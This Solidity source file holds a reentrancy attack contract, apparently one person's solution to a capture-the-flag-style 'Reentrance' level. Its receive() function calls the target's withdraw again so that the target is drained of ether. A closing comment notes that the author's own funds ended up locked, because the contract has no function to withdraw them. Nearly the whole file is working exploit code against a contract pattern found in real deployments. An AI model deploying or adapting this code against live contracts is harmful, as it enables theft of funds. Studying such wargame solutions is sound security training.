// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint);
    function withdraw(uint) external;
}

contract ReentranceHack {
    address public instanceAddress;

    constructor(address instance) {
        instanceAddress = instance;
    }

    function withdraw() public {
        IReentrance(instanceAddress).withdraw(0.0005 ether);
    }

    receive() external payable {
        IReentrance(instanceAddress).withdraw(0.0005 ether);
    }
}

// Realized post script execution, I do not have a withdraw function here. Funds are locked 0.0015 ether 😢
